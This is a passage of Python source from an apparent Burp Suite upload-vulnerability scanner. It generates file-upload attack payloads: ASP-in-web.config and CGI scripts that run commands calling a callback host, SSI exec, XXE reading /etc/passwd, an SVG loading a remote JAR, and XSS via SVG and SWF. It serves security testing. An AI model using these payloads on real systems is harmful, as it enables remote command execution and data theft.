        return self._htaccess_asp_web_config(injector, burp_colab)

    def _htaccess_asp_web_config(self, injector, burp_colab):
        colab_tests = []

        one = ''.join(random.sample(string.ascii_letters, 8))
        two = ''.join(random.sample(string.ascii_letters, 8))
        three = ''.join(random.sample(string.ascii_letters, 8))

        # create replace list and file that executes all rce commands at once
        replace_list = []
        command_names = []
        commands = ""
        for cmd_name, cmd, server, replace in self._get_rce_interaction_commands(injector, burp_colab):
            replace_list.append(replace)
            command_names.append(cmd_name)
            commands += 'Set wShell1 = CreateObject("WScript.Shell")\n'
            commands += 'Set cmd1 = wShell1.Exec("{} {}")\n'.format(cmd, server)

        content = """<?xml version="1.0" encoding="UTF-8"?>
<configuration>
   <system.webServer>
      <handlers accessPolicy="Read, Script, Write">
         <add name="web_config" path="*.config" verb="*" modules="IsapiModule" scriptProcessor="%windir%\system32\inetsrv\asp.dll" resourceType="Unspecified" requireAccess="Write" preCondition="bitness64" />
      </handlers>
      <security>
         <requestFiltering>
            <fileExtensions>
               <remove fileExtension=".config" />
            </fileExtensions>
            <hiddenSegments>
               <remove segment="web.config" />
            </hiddenSegments>
         </requestFiltering>
      </security>
   </system.webServer>
   <appSettings>
</appSettings>
</configuration>
<!--
<%
a = "{}"
b = "{}"
c = "{}"
Response.write("-"&"->")
Response.write(a&c&b)
{}
%>
-->""".format(one, two, three, commands)
        expect = one + three + two

        basename = "web"
        types = {
            ('', '.config::$DATA', ''),
            ('', '.config', '')
        }
        title = "Web.config RCE"
        base_detail = 'The server executes web.config files that are uploaded, which results in a Remote Command Execution (RCE). <br>' \
                      'See https://soroush.secproject.com/blog/2014/07/upload-a-web-config-file-for-fun-profit/ .'
        detail_download = "A web.config file was uploaded and in the download the ASP concatenation of three variables was " \
                          "replaced with {} only. <br><br> {} <br>".format(expect, base_detail)
        detail_colab = "A Burp Collaborator interaction was detected when uploading a web.config file executing {} for a " \
                       "burp collaborator URL. <br><br> {} <br>" \
                       "Interactions:<br><br>".format(", ".join(command_names), base_detail)
        issue_download = self._create_issue_template(injector.get_brr(), title, detail_download, "Certain", "High")
        issue_colab = self._create_issue_template(injector.get_brr(), title, detail_colab, "Certain", "High")
        self.dl_matchers.add(DownloadMatcher(issue_download, filecontent=expect))
        # We do not need to call self.sender.simple here as in this case the send_collaborator will be sufficient
        colab_tests.extend(self._send_collaborator(injector, burp_colab, types, basename, content, issue_colab,
                                                   redownload=True, replace=replace_list, randomize=False))

        return colab_tests

    def _cgi(self, injector, burp_colab):
        colab_tests = []

        if not burp_colab:
            return []

        # Do not forget, for CGI to work, the files have to be executable (chmod +x), which will not be the case
        # for a lot of servers...
        # Therefore additional sleep based payloads would not make sense

        rand_a = ''.join(random.sample(string.ascii_letters, 20))
        rand_b = ''.join(random.sample(string.ascii_letters, 20))
        expect = rand_a + rand_b
        # create replace list and file that executes all rce commands at once
        replace_list = []
        command_names = []
        commands = ""
        for cmd_name, cmd, server, replace in self._get_rce_interaction_commands(injector, burp_colab):
            replace_list.append(replace)
            command_names.append(cmd_name)
            commands += "`{} {}`;\n".format(cmd, server)

        # Do NOT print(a status header (HTTP/1.0 200 OK) for perl)
        content_perl = "#!/usr/bin/env perl\n" \
                       "print \"Content-type: text/html\\n\\n\"\n" \
                       "{}" \
                       "local ($k);\n" \
                       "$k = \"{}\";\n" \
                       "print $k . \"{}\";".format(commands, rand_a, rand_b)
        basename = Constants.DOWNLOAD_ME + Constants.FILE_START + "Perl"
        title = "Perl code injection"
        base_detail = 'The server executes Perl files that are uploaded, which results in a Remote Command Execution (RCE). '
        detail_download = "A Perl file was uploaded and in the download the code $k = '{}'; print $k . '{}'; was " \
                          "replaced with {} only. <br><br> {} <br>".format(rand_a, rand_b, expect, base_detail)
        detail_colab = "A Burp Collaborator interaction was detected when uploading a Perl file executing {} for a " \
                       "burp collaborator URL. <br><br> {} <br>" \
                       "Interactions:<br><br>".format(", ".join(command_names), base_detail)
        issue_download = self._create_issue_template(injector.get_brr(), title, detail_download, "Certain", "High")
        issue_colab = self._create_issue_template(injector.get_brr(), title, detail_colab, "Certain", "High")
        self.dl_matchers.add(DownloadMatcher(issue_download, filecontent=expect))
        # We do not need to call self.sender.simple here as in this case the send_collaborator will be sufficient
        colab_tests.extend(self._send_collaborator(injector, burp_colab, Constants.PL_TYPES, basename, content_perl, issue_colab,
                                               redownload=True, replace=replace_list))


        rand_a = ''.join(random.sample(string.ascii_letters, 20))
        rand_b = ''.join(random.sample(string.ascii_letters, 20))
        expect = rand_a + rand_b
        # create DNS or IP Collaborator URl
        if burp_colab.is_ip_collaborator:
            python3_url = "http://test.example.org/Python3"
            python2_url = "http://test.example.org/Python2"
        else:
            python3_url = "http://python3.test.example.org/Python3"
            python2_url = "http://python2.test.example.org/Python2"

        # Do NOT print(a status header (HTTP/1.0 200 OK) for python)
        content_python = "#!/usr/bin/env python\n" \
                       "import sys\n" \
                       "print 'Content-type: text/html\\n\\n'\n" \
                       "if sys.version_info >= (3, 0):\n" \
                       "  import urllib.request\n" \
                       "  urllib.request.urlopen('{}').read()\n" \
                       "else:\n" \
                       "  import urllib2\n" \
                       "  urllib2.urlopen('{}').read()\n" \
                       "k = '{}'\n" \
                       "print k + '{}'".format(python3_url, python2_url, rand_a, rand_b)
        basename = Constants.DOWNLOAD_ME + Constants.FILE_START + "Python"
        title = "Python code injection"
        base_detail = 'The server executes Python files that are uploaded, which results in a Remote Command Execution (RCE). '
        detail_download = "A Python file was uploaded and in the download the code k = '{}'; print k + '{}'; was " \
                          "replaced with {} only. <br><br> {} <br>".format(rand_a, rand_b, expect, base_detail)
        detail_colab = "A Burp Collaborator interaction was detected when uploading a Python file executing a GET request for a " \
                       "burp collaborator URL. <br><br> {} <br>" \
                       "Interactions:<br><br>".format(base_detail)
        issue_download = self._create_issue_template(injector.get_brr(), title, detail_download, "Certain", "High")
        issue_colab = self._create_issue_template(injector.get_brr(), title, detail_colab, "Certain", "High")
        self.dl_matchers.add(DownloadMatcher(issue_download, filecontent=expect))
        # We do not need to call self.sender.simple here as in this case the send_collaborator will be sufficient
        colab_tests.extend(self._send_collaborator(injector, burp_colab, Constants.PY_TYPES, basename, content_python, issue_colab,
                                                   redownload=True, replace="test.example.org"))


        rand_a = ''.join(random.sample(string.ascii_letters, 20))
        rand_b = ''.join(random.sample(string.ascii_letters, 20))
        expect = rand_a + rand_b
        # create DNS or IP Collaborator URl
        if burp_colab.is_ip_collaborator:
            ruby_url = "http://test.example.org/Ruby"
        else:
            ruby_url = "http://ruby.test.example.org/Ruby"
        # Do NOT print(a status header (HTTP/1.0 200 OK) for ruby)
        content_ruby1 = "#!/usr/bin/env ruby\n" \
                       "require 'net/http'\n" \
                       "puts \"Content-type: text/html\\n\\n\"\n" \
                       "url=URI.parse('{}')\n" \
                       "req=Net::HTTP::Get.new(url.to_s)\n" \
                       "Net::HTTP.start(url.host,url.port){|http|http.request(req)}\n"
        content_ruby2 = "k = \"{}\"\n" \
                       "puts k + \"{}\"".format(ruby_url, rand_a, rand_b)
        content_ruby = content_ruby1 + content_ruby2
        basename = Constants.DOWNLOAD_ME + Constants.FILE_START + "Ruby"
        title = "Ruby code injection"
        base_detail = 'The server executes Ruby files that are uploaded, which results in a Remote Command Execution (RCE). '
        detail_download = "A Ruby file was uploaded and in the download the code k = \"{}\"; puts k + \"{}\"; was " \
                          "replaced with {} only. <br><br> {} <br>".format(rand_a, rand_b, expect, base_detail)
        detail_colab = "A Burp Collaborator interaction was detected when uploading a Ruby file executing a GET request for a " \
                       "burp collaborator URL. <br><br> {} <br>" \
                       "Interactions:<br><br>".format(base_detail)
        issue_download = self._create_issue_template(injector.get_brr(), title, detail_download, "Certain", "High")
        issue_colab = self._create_issue_template(injector.get_brr(), title, detail_colab, "Certain", "High")
        self.dl_matchers.add(DownloadMatcher(issue_download, filecontent=expect))
        # We do not need to call self.sender.simple here as in this case the send_collaborator will be sufficient
        colab_tests.extend(self._send_collaborator(injector, burp_colab, Constants.RB_TYPES, basename, content_ruby, issue_colab,
                                                   redownload=True, replace="test.example.org"))

        # Not going to add as a feature: elf binary .cgi files
        # If those work, then Python or Perl works in most cases too...

        return colab_tests

    def _ssi_payload(self):
        non_existant_domain = "{}.{}.local".format(str(random.randint(100000, 999999)), str(random.randint(100000, 999999)))
        expect = " can't find " + non_existant_domain
        content = '<!--#exec cmd="nslookup ' + non_existant_domain + '" -->'
        return content, expect

    def _ssi(self, injector, burp_colab):
        issue_name = "SSI injection"
        severity = "High"
        confidence = "Certain"

        # Reflected nslookup
        # This might fail if the DNS is responding with default DNS entries, then it won't say "can't find" and the
        # domain but I couldn't come up with anything better for SSI except Burp collaborator payloads and this...
        # At least "can't find" + domain is present in Linux and Windows nslookup output
        main_detail = "A certain string was dectected when uploading and downloading an Server Side Include file with a " \
                      "payload that executes commands with nslookup. Therefore arbitrary command execution seems possible. " \
                      "Note that if you enabled the .htaccess module as well, this attack might have only succeeded because " \
                      "we were already able to upload a .htaccess file that enables SSI. The payload in this attack was: " \
                      "<br><br>{}<br><br> The found string in a response was: " \
                      "<br>{}<br><br>"

        # Reflected nslookup - Simple
        basename = Constants.DOWNLOAD_ME + Constants.FILE_START + "SsiReflectDnsSimple"
        content, expect = self._ssi_payload()
        detail = main_detail.format(cgi.escape(content), cgi.escape(expect))
        issue = self._create_issue_template(injector.get_brr(), issue_name, detail, confidence, severity)
        self.dl_matchers.add(DownloadMatcher(issue, filecontent=expect))
        self.sender.simple(injector, Constants.SSI_TYPES, basename, content, redownload=True)

        # Reflected nslookup - File metadata
        bi = BackdooredFile(injector.opts.get_enabled_file_formats(), self._globalOptionsPanel.image_exiftool)
        size = (injector.opts.image_width, injector.opts.image_height)
        for payload, expect, name, ext, content in bi.get_files(size, self._ssi_payload):
            basename = Constants.DOWNLOAD_ME + Constants.FILE_START + "SsiReflectDns" + name
            detail = main_detail + "In this case the payload was injected into a file with metatadata of type {}."
            detail = detail.format(cgi.escape(content), cgi.escape(expect), name)
            issue = self._create_issue_template(injector.get_brr(), issue_name, detail, confidence, severity)
            self.dl_matchers.add(DownloadMatcher(issue, filecontent=expect))
            self.sender.simple(injector, Constants.SSI_TYPES, basename, content, redownload=True)

        # TODO: Decide if additional sleep based payloads would make sense, probably rather not

        # Burp community edition doesn't have Burp collaborator
        if not burp_colab:
            return []

        colab_tests = []

        # RCE with Burp collaborator
        base_detail = "A burp collaborator interaction was dectected when uploading an Server Side Include file with a payload that " \
                "executes commands with a burp collaborator URL. Therefore arbitrary command execution seems possible. Note that if " \
                "you enabled the .htaccess module as well, this attack might have only succeeded because we were " \
                "already able to upload a .htaccess file that enables SSI. "

        # RCE with Burp collaborator - Simple
        for cmd_name, cmd, server, replace in self._get_rce_interaction_commands(injector, burp_colab):
            basename = Constants.DOWNLOAD_ME + Constants.FILE_START + "SsiColab" + cmd_name
            content = '<!--#exec cmd="{} {}" -->'.format(cmd, server)
            detail = "{}A {} payload was used. <br>Interactions: <br><br>".format(base_detail, cmd_name)
            issue = self._create_issue_template(injector.get_brr(), issue_name, detail, confidence, severity)
            colab_tests.extend(self._send_collaborator(injector, burp_colab, Constants.SSI_TYPES, basename,
                                                       content, issue, replace=replace, redownload=True))

        # RCE with Burp collaborator - File metadata
        # For SSI backdoored files we only use the first payload type (either nslookup or wget)
        # as otherwise we run into a combinatoric explosion with payload types multiplied with exiftool techniques
        base_desc = 'Remote command execution through SSI payload in Metadata of type {}. The server executed a SSI ' \
                    'Burp Collaborator payload with {} inside the uploaded file. ' \
                    '<br>Interactions: <br><br>'
        cmd_name, cmd, server, replace = next(iter(self._get_rce_interaction_commands(injector, burp_colab)))
        ssicolab = SsiPayloadGenerator(burp_colab, cmd, server, replace)
        bi = BackdooredFile(injector.opts.get_enabled_file_formats(), self._globalOptionsPanel.image_exiftool)
        size = (injector.opts.image_width, injector.opts.image_height)
        for payload, _, name, ext, content in bi.get_files(size, ssicolab.payload_func):
            basename = Constants.DOWNLOAD_ME + Constants.FILE_START + "SsiBfRce" + name
            desc = base_desc.format(cgi.escape(name), cgi.escape(cmd_name))
            issue = self._create_issue_template(injector.get_brr(), issue_name, base_detail + desc, confidence, severity)
            colab_tests.extend(self._send_collaborator(injector, burp_colab, Constants.SSI_TYPES, basename,
                                                       content, issue, replace=ssicolab.placeholder, redownload=True))

        return colab_tests

    def _esi_payload(self):
        one = ''.join(random.sample(string.ascii_letters, 5))
        two = ''.join(random.sample(string.ascii_letters, 5))
        three = ''.join(random.sample(string.ascii_letters, 5))
        content = '{}<!--esi-->{}<!--esx-->{}'.format(one, two, three)
        expect = '{}{}<!--esx-->{}'.format(one, two, three)
        return content, expect

    def _esi(self, injector, burp_colab):
        issue_name = "ESI injection"
        severity = "High"
        confidence = "Certain"

        # Reflected stripped esi tag
        base_detail = "When uploading an Edge Side Include file with a payload of {}, the server later responded with " \
                      "{} only. This means that ESI might be enabled. The payload was an Edge Side Include (ESI) tag, see " \
                      "https://gosecure.net/2018/04/03/beyond-xss-edge-side-include-injection/. "

        # Reflected stripped esi tag - Simple
        basename = Constants.DOWNLOAD_ME + Constants.FILE_START + "EsiReflectSimple"
        content, expect = self._esi_payload()
        detail = base_detail.format(cgi.escape(content), cgi.escape(expect))
        issue = self._create_issue_template(injector.get_brr(), issue_name, detail, confidence, severity)
        self.dl_matchers.add(DownloadMatcher(issue, filecontent=expect))
        self.sender.simple(injector, Constants.ESI_TYPES, basename, content, redownload=True)

        # Reflected nslookup - File metadata
        bi = BackdooredFile(injector.opts.get_enabled_file_formats(), self._globalOptionsPanel.image_exiftool)
        size = (injector.opts.image_width, injector.opts.image_height)
        for payload, expect, name, ext, content in bi.get_files(size, self._esi_payload):
            basename = Constants.DOWNLOAD_ME + Constants.FILE_START + "EsiReflect" + name
            detail = base_detail + "In this case the payload was injected into a file with metatadata of type {}."
            detail = detail.format(cgi.escape(content), cgi.escape(expect), name)
            issue = self._create_issue_template(injector.get_brr(), issue_name, detail, confidence, severity)
            self.dl_matchers.add(DownloadMatcher(issue, filecontent=expect))
            self.sender.simple(injector, Constants.ESI_TYPES, basename, content, redownload=True)

        # Burp community edition doesn't have Burp collaborator
        if not burp_colab:
            return []

        colab_tests = []

        # ESI injection - includes remote URL -> burp collaborator
        # According to feedback on https://github.com/modzero/mod0BurpUploadScanner/issues/11
        # this is unlikely to be successfully triggered
        basename = Constants.DOWNLOAD_ME + Constants.FILE_START + "EsiColab"
        content = '<esi:include src="{}1.html" alt="{}" onerror="continue"/>'.format(Constants.MARKER_COLLAB_URL, Constants.MARKER_CACHE_DEFEAT_URL)
        detail = "A burp collaborator interaction was dectected when uploading an Edge Side Include file with a payload that " \
                 "includes a burp collaborator URL. The payload was an Edge Side Include (ESI) tag, see " \
                 "https://gosecure.net/2018/04/03/beyond-xss-edge-side-include-injection/. As it is unlikely " \
                 "that ESI attacks result in successful Burp Collaborator interactions, this is also likely to " \
                 "be a Squid proxy, which is one of the few proxies that support that.<br>Interactions: <br><br>"
        issue = self._create_issue_template(injector.get_brr(), issue_name, detail, confidence, severity)
        colab_tests.extend(self._send_collaborator(injector, burp_colab, Constants.ESI_TYPES, basename,
                                                   content, issue, redownload=True))

        # Not doing the metadata file + Burp Collaborator approach here, as that seems to be a waste of requests as explained
        # on https://github.com/modzero/mod0BurpUploadScanner/issues/11

        return colab_tests

    def _xxe_svg_external_image(self, injector, burp_colab):
        colab_tests = []
        # Burp community edition doesn't have Burp collaborator
        if not burp_colab:
            return colab_tests
        if injector.opts.file_formats['svg'].isSelected():
            root_tag = '<?xml version="1.0" encoding="UTF-8" standalone="no"?>'
            text_tag = '<text x="0" y="20" font-size="20">test</text>'
            # The standard file we are going to use for the tests:
            base_svg = root_tag + '<svg xmlns:svg="http://www.w3.org/2000/svg" xmlns="http://www.w3.org/2000/svg" ' \
                                  'xmlns:xlink="http://www.w3.org/1999/xlink" ' \
                                  'width="{}" height="{}">{}</svg>'.format(str(injector.opts.image_width),
                                                                      str(injector.opts.image_height),
                                                                      text_tag)

            # First, the SVG specific ones
            # External Image with <image xlink
            content_xlink = base_svg.replace(text_tag, '<image height="30" width="30" xlink:href="{}image.jpeg" />'.format(Constants.MARKER_COLLAB_URL))
            basename = Constants.DOWNLOAD_ME + Constants.FILE_START + "SvgXlink"
            name = "XXE/SSRF via SVG"  # Xlink
            severity = "High"
            confidence = "Certain"
            detail = "A Burp Colaborator interaction was detected when uploading an SVG image with an Xlink reference " \
                     "which contains a burp collaborator URL. This means that Server Side Request Forgery is possible. " \
                     'The payload was <image xlink:href="{}" /> . ' + \
                     "Usually you will be able to read local files, eg. local pictures. " \
                     "Interactions:<br><br>".format(Constants.MARKER_COLLAB_URL)
            issue = self._create_issue_template(injector.get_brr(), name, detail, confidence, severity)
            colab_tests.extend(self._send_collaborator(injector, burp_colab, Constants.SVG_TYPES, basename, content_xlink, issue,
                                                  redownload=True))

            # External iFrame according to https://twitter.com/akhilreni_hs/status/1113762867881185281 and
            # https://gist.github.com/akhil-reni/5ed75c28a5406c300597431eafcdae2d
            content_iframe = '<g><foreignObject width="{}" height="{}"><body xmlns="http://www.w3.org/1999/xhtml">' \
                             '<iframe src="{}"></iframe></body></foreignObject></g>'.format(str(injector.opts.image_width),
                                                                                            str(injector.opts.image_height),
                                                                                            Constants.MARKER_COLLAB_URL)
            basename = Constants.DOWNLOAD_ME + Constants.FILE_START + "SvgIframe"
            name = "XXE/SSRF via SVG"  # Iframe
            severity = "High"
            confidence = "Certain"
            detail = "A Burp Colaborator interaction was detected when uploading an SVG image with an iframe reference " \
                     "which contains a burp collaborator URL. This means that Server Side Request Forgery is possible. " \
                     'The payload was <iframe src="{}"> . ' + \
                     "Usually you will be able to read local files, eg. local pictures. " \
                     "Interactions:<br><br>".format(Constants.MARKER_COLLAB_URL)
            issue = self._create_issue_template(injector.get_brr(), name, detail, confidence, severity)
            colab_tests.extend(self._send_collaborator(injector, burp_colab, Constants.SVG_TYPES, basename, content_iframe, issue,
                                                       redownload=True))


            # What if the server simply reads the SVG and turn it into a JPEG that has the content?
            # That will be hard to detect (would need something like OCR on JPEG), but at least the user
            # might see that picture... We also regex the download if we detect a passwd...
            basename = Constants.DOWNLOAD_ME + Constants.FILE_START + "SvgPasswdTxt"
            ref = '<?xml version="1.0" encoding="UTF-8" standalone="yes"?><!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/passwd" > ]>'
            passwd_svg = base_svg
            passwd_svg = passwd_svg.replace(root_tag, ref)
            passwd_svg = passwd_svg.replace(text_tag, '<text x="0" y="20" font-size="20">&xxe;</text>')
            urrs = self.sender.simple(injector, Constants.SVG_TYPES, basename, passwd_svg, redownload=True)
            for urr in urrs:
                if urr and urr.download_rr:
                    resp = urr.download_rr.getResponse()
                    if resp:
                        resp = FloydsHelpers.jb2ps(resp)
                        if Constants.REGEX_PASSWD.match(resp):
                            name = "SVG Local File Include"
                            severity = "High"
                            confidence = "Firm"
                            detail = "A passwd-like response was downloaded when uploading an SVG file with a payload that " \
                                     "tries to include /etc/passwd. Therefore arbitrary file read seems possible. "
                            issue = self._create_issue_template(injector.get_brr(), name, detail, confidence, severity)
                            issue.httpMessagesPy = [urr.upload_rr, urr.download_rr]
                            self._add_scan_issue(issue)


            # Now let's do the generic ones from the Xxe class
            for payload_desc, technique_name, svg in Xxe.get_payloads(base_svg, root_tag, text_tag, 'text'):
                basename = Constants.DOWNLOAD_ME + Constants.FILE_START + "XxeSvg" + technique_name
                name = "XXE/SSRF via SVG"  # " + technique_name
                severity = "Medium"
                confidence = "Certain"
                detail = "A Burp Colaborator interaction was detected when uploading an SVG image with an " + technique_name + " payload " \
                         "which contains a burp colaborator URL. This means that Server Side Request Forgery is possible. " \
                         'The payload was ' + cgi.escape(payload_desc) + ' . ' \
                         "Usually you will be able to read local files, eg. local pictures. " \
                         "This issue needs further manual investigation. " \
                         "Interactions:<br><br>"
                issue = self._create_issue_template(injector.get_brr(), name, detail, confidence, severity)
                colab_tests.extend(
                    self._send_collaborator(injector, burp_colab, Constants.SVG_TYPES, basename, svg, issue,
                                            redownload=True))

        return colab_tests

    def _xxe_svg_external_java_archive(self, injector, burp_colab):
        colab_tests = []
        # Burp community edition doesn't have Burp collaborator
        if not burp_colab:
            return colab_tests
        if injector.opts.file_formats['svg'].isSelected():
            # The standard file we are going to use for the tests:
            base_svg = '<svg xmlns:svg="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" ' \
                       'version="1.0"><script type="application/java-archive" xlink:href="{}evil.jar' \
                       '"/><text>test</text></svg>'.format(Constants.MARKER_COLLAB_URL)
            basename = Constants.DOWNLOAD_ME + Constants.FILE_START + "SvgScriptJava"
            name = "SVG Script Xlink Java Archive"
            severity = "Medium"
            confidence = "Certain"
            detail = "A Burp Colaborator interaction was detected when uploading an SVG image with a script tag with a Xlink reference " \
                     "which contains a burp colaborator URL. This means that Server Side Request Forgery is at least possible. " \
                     "However, it is also likely that this results in Remote Command Execution if the JAR file is downloaded and executed. " \
                     "See the following metasploit module as an example for RCE: " \
                     "https://github.com/rapid7/metasploit-framework/blob/master/modules/exploits/multi/misc/batik_svg_java.rb " \
                     'The payload was <script type="application/java-archive" xlink:href="{}evil.jar"/> . ' \
                     "Usually you will be able to read local files, eg. local pictures. " \
                     "Interactions:<br><br>".format(Constants.MARKER_COLLAB_URL)
            issue = self._create_issue_template(injector.get_brr(), name, detail, confidence, severity)
            colab_tests.extend(self._send_collaborator(injector, burp_colab, Constants.SVG_TYPES, basename, base_svg, issue, redownload=True))
        return colab_tests

    def _xxe_xml(self, injector, burp_colab):
        colab_tests = []
        # Burp community edition doesn't have Burp collaborator
        if not burp_colab:
            return colab_tests
        if injector.opts.file_formats['xml'].isSelected():
            # The standard file we are going to use for the tests:
            root_tag = '<?xml version="1.0" encoding="UTF-8" standalone="no"?>' \
                       '<!DOCTYPE test [ \n <!ELEMENT text ANY> \n]>'
            test_tag = '<text>test</text>'
            base_xml = root_tag + test_tag

            for payload_desc, technique_name, xml in Xxe.get_payloads(base_xml, root_tag, test_tag, 'text'):
                basename = Constants.DOWNLOAD_ME + Constants.FILE_START + "XxeXml" + technique_name
                name = "XML " + technique_name + " SSRF/XXE"
                severity = "Medium"
                confidence = "Certain"
                detail = "A Burp Colaborator interaction was detected when uploading an XML file with an " + technique_name + " payload " \
                         "which contains a burp colaborator URL. This means that Server Side Request Forgery is possible. " \
                         'The payload was ' + cgi.escape(payload_desc) + ' . ' \
                         "Usually you will be able to read local files and do SSRF. This issue needs further manual investigation." \
                         "Interactions:<br><br>"
                issue = self._create_issue_template(injector.get_brr(), name, detail, confidence, severity)
                colab_tests.extend(self._send_collaborator(injector, burp_colab, Constants.XML_TYPES, basename, xml, issue, redownload=True))

        return colab_tests

    def _xxe_office(self, injector, burp_colab):
        colab_tests = []
        # Burp community edition doesn't have Burp collaborator
        if not burp_colab:
            return colab_tests
        x = XxeOfficeDoc(injector.opts.get_enabled_file_formats())
        for payload, name, ext, content in x.get_files():
            basename = Constants.DOWNLOAD_ME + Constants.FILE_START + "XxeOffice" + name
            title = "XXE/SSRF via XML" # " + ext[1:].upper()
            desc = 'XXE through injection of XML {} payloads in the contents of a {} file. The server parsed the code ' \
                   '{} which resulted in a SSRF. '.format(name, ext[1:].upper(), cgi.escape(payload))
            issue = self._create_issue_template(injector.get_brr(), title, desc, "Firm", "High")
            types = [
                ('', ext, ''),
                ('', ext, XxeOfficeDoc.EXTENSION_TO_MIME[ext]),
            ]
            c = self._send_collaborator(injector, burp_colab, types, basename, content, issue,
                                        replace=x._inject_burp_url, redownload=True)
            colab_tests.extend(c)
        return colab_tests

    def _xxe_xmp(self, injector, burp_colab):
        # Burp community edition doesn't have Burp collaborator
        if not burp_colab:
            return []
        # This is a pretty special case...
        # As we need to fix the XMP metadata length *after* injecting the Burp collaborator URL
        # in the XMP, we can not use functions such as _send_burp_collaborator.
        # Additionally, we would like to (Ab)use the BackdooredFile class to produce the basic
        # Images with XMP tags.
        # Therefore this was entirely implemented in its own class... not a beauty, but it works
        x = XxeXmp(injector.opts.get_enabled_file_formats(), self._globalOptionsPanel.image_exiftool, injector.opts.image_width,
                   injector.opts.image_height, Constants.MARKER_ORIG_EXT, Constants.PROTOCOLS_HTTP, Constants.FILE_START,
                   self._make_http_request)
        return x.do_collaborator_tests(injector, burp_colab, injector.opts.get_enabled_file_formats())

    def _xss_html(self, injector):
        if injector.opts.file_formats['html'].isSelected():
            basename = Constants.DOWNLOAD_ME + Constants.FILE_START + "HtmlXss"
            content = '<html><head></head><body>this is just a little html</body></html>'
            title = "Cross-site scripting (stored)" # via HTML file upload"
            desc = 'XSS via HTML file upload and download. '
            issue = self._create_issue_template(injector.get_brr(), title, desc, "Firm", "High")
            self.dl_matchers.add(DownloadMatcher(issue, filecontent=content, check_xss=True))
            self.sender.simple(injector, Constants.HTML_TYPES, basename, content, redownload=True)
        return []

    def _xss_svg(self, injector):
        if injector.opts.file_formats['svg'].isSelected():
            basename = Constants.DOWNLOAD_ME + Constants.FILE_START + "SvgXss"
            content_svg = '<?xml version="1.0" standalone="no"?><!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" ' \
                          '"http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd"><svg version="1.1" baseProfile="full" ' \
                          'xmlns="http://www.w3.org/2000/svg" width="{}" height="{}"><polygon id="triangle" ' \
                          'points="0,0 0,0 0,0" stroke="#004400"/><script type="text/javascript">prompt();' \
                          '</script></svg>'.format(str(injector.opts.image_width), str(injector.opts.image_height))
            title = "Cross-site scripting (stored)" # via SVG"
            desc = 'XSS through SVG upload and download as SVG can include JavaScript and will execute same origin.'
            issue = self._create_issue_template(injector.get_brr(), title, desc, "Firm", "High")
            self.dl_matchers.add(DownloadMatcher(issue, filecontent=content_svg, check_xss=True))
            self.sender.simple(injector, Constants.SVG_TYPES, basename, content_svg, redownload=True)
        return []

    def _xss_swf(self, injector):
        if injector.opts.file_formats['swf'].isSelected():
            basename = Constants.DOWNLOAD_ME + Constants.FILE_START + "XssProject"
            content = 'Q1dTDmkGAAB4AWVU3VLbRhTe1dqW/2UDMeBAozQ0jgm2ZMMwgyGeUgwZbiATXyTDoPEs0gorkbUaScZmOpm+SSe96Wv0AXLjXrQP0KvO9KLuE6QriSB' \
                      'MNKOfPec7335nzzkag9hfAOR/BWAJgk5xGQDw0/wnCMCeo+mt150jcTwwLbfFVi8qfc+zW5I0Go3qo806dS6lxs7OjiQ3pWazxhA199ry8LhmuU8q7' \
                      'YCgQ1zVMWzPoJboE+ILOvReVCo3rJp6S2oPHTOg1FSJmGRALM+VGvUGI9LUlk6dAfba2LZNQ8U+nTSuuX2qvh/hK1LTTez296QI6Md4hmeS9r5GL4h' \
                      '4ZJKxuCXuR/EBOoT4YC0S2r6TJvaj6yodSLZDtaHKNOmMKgi+G+JT2MML03D7xGkPrfcWHVkBKrL6GNUh2KOziC82329i63KIL0n78CSIvl0HGrFH2' \
                      'if0SmzIG2JTbjRDGb51T/JP985p31hYAdsgXxgun5zWXu13u29OX3fARGBVnrk6hb/RHjjgPn/+fJZGzJVgdyzxy1mIyuCf/2mxnviUftvtvnLoO6J' \
                      '64LeFbAwAZgV3jAVQ90Oe3wUqB63zDlWHQUlFbGlil3ieYV265/vawLAM13P8Q2GrsFSsluIPQ8PUiCNu1bfPI/5z11F3d6N1HbvZaLUmJ7tEHTqGd' \
                      '50NOqLuXrseGcD1DDZNOurQATas4uHYI46FzWOLvXWsknwIJjf2uQF23D6LOByrJGhdV5Crux9Y36n9Z6T644fdmEOplzYpZhKPLZ2mbezgAWF8Lvf' \
                      'OFSJJTOCa/PimoaJm2u9uSk1Z3pYuWJrsKBZCBZrh2ia+bnVtlgNZmzV2QufphX/6B5QNmmER59EsKMgJq55xRULgw1n/DMlK6CNX/qy1Dv2X7/fTJ' \
                      'A4nSTGVHUL80HGoA0mcFUklD6LUpOgzN7NJIpSfCAUI93hvKhNumpvRU/xKfWnGf5v0Sq93SXse7amsbXoa0VkT+f+EXp+YNrKpixrbm4tfQPf9jcZ' \
                      'WMQ5LiRJXSseLi1xybgmWYXm+vFB+UC6VF0vflL7lchDF4gk+mUpnsrn8As/FeZTkYykeZXiU41GeR0KqAHm0zKMyjx7yaIVHkBce8UjkC4954Qkvr' \
                      'PHCd2yYODYQq+zBAe4prDyrwso6zOVTyWB2IAdzHch8EAEIkyk0kV+yqUIoLfT/Q9PkRH6z/of8L4yB5DQ1OQbTtAJ1uMEfcbA6zShIR09xbJr3Pza' \
                      'ySlyP6wmd15MfN5Y+HqUYRCisADCRf5fPwPqf6/LzAZwWlCzhTHiUhdXVJDedewmrB8fpDOA4JmBnIrNtEwQogi7ISkEvyEpRL8rKnD4nK/P6vKzk9' \
                      'XzweAtWg6ufYxFxplqYv/c3+J5l/j9Txem0'
            content = content.decode("base64")
            title = "Cross-site scripting (stored)" # via SWF"
            desc = 'XSS through SWF file (Adobe Flash) upload and download. ' \
                   'See https://soroush.secproject.com/blog/2012/11/xss-by-uploadingincluding-a-swf-file/ for more details. ' \
                   'There might be other issues with file uploads that allow .swf uploads, for example https://hackerone.com/reports/51265 .'
            issue = self._create_issue_template(injector.get_brr(), title, desc, "Firm", "Medium")
            # TODO feature: Check if other content_types work too rather than only application/x-shockwave-flash...
            self.dl_matchers.add(DownloadMatcher(issue, filecontent=content, check_xss=True))
            self.sender.simple(injector, Constants.SWF_TYPES, basename, content, redownload=True)
        return []

    def _xss_payload(self):
        r = ''.join(random.sample(string.ascii_letters, 10))
        payload = '<b>' + r + '</b>'
        expect = payload
        return payload, expect

    def _xss_backdoored_file(self, injector):
